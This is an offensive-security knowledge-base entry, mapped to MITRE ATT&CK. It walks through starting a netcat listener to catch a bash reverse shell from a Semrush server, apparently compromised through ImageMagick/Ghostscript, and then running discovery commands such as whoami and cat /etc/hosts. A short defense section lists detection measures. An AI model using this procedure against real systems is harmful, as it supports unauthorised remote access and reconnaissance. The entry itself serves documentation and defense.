---
tags:
  - reverse-shell
  - shell-interaction
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
commands:
  - '[[commands/list-directory]]'
  - '[[commands/identify-current-user]]'
  - '[[commands/list-specific-directory]]'
  - '[[commands/view-hosts-file]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:24:17.707Z'
sub_techniques: []
id: b1360fb1-4f1e-4be5-96ec-ae0b01b694d3
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Establish and Interact with Reverse Shell

## Summary

This procedure sets up a listener to catch the reverse shell from the exploited server and executes commands to explore the filesystem and confirm access.

## Description

Upon payload execution, a bash reverse shell connects back to the attacker's netcat listener. Interact by running discovery commands to list directories, identify the user, check app paths, and view system hosts, verifying RCE on the Semrush Linux server running ImageMagick/Ghostscript.

## Requirements

1. Netcat (nc) installed on attacker machine
2. Port 8080 open and forwarded if behind NAT
3. IP address static or known to target

## Defense

Defensive measures and detection strategies:

- Monitor outbound connections on high ports
- Use host-based IDS to detect unexpected bash invocations
- Restrict web server process capabilities

## Objectives

1. Receive and stabilize shell session
2. Perform initial discovery
3. Gather evidence of compromise

## Instructions

### Step 1: Start Listener

**Context**: Prepare to receive connection.

Execute on attacker machine:

```bash
nc -lvnp 8080
```

> Wait for incoming connection from target.

### Step 2: Execute Discovery Commands

**Context**: Explore server.

Once connected, run:

**Command** ([[commands/list-directory]]):
```bash
ls
```

> Lists current directory contents, e.g., app, [redacted].

**Command** ([[commands/identify-current-user]]):
```bash
whoami
```

> Shows user, e.g., [redacted] web user.

**Command** ([[commands/list-specific-directory]]):
```bash
ls [redacted dir]
```

> Verifies Semrush files like [redacted].php.

**Command** ([[commands/view-hosts-file]]):
```bash
cat /etc/hosts
```

> Confirms semrush.net entries.

**Expected Output**: Command outputs reveal server details.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Discovery]] Discovery

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/list-directory]]
- [[commands/identify-current-user]]
- [[commands/list-specific-directory]]
- [[commands/view-hosts-file]]

## Tools Used


## Tags

- reverse-shell
- shell-interaction
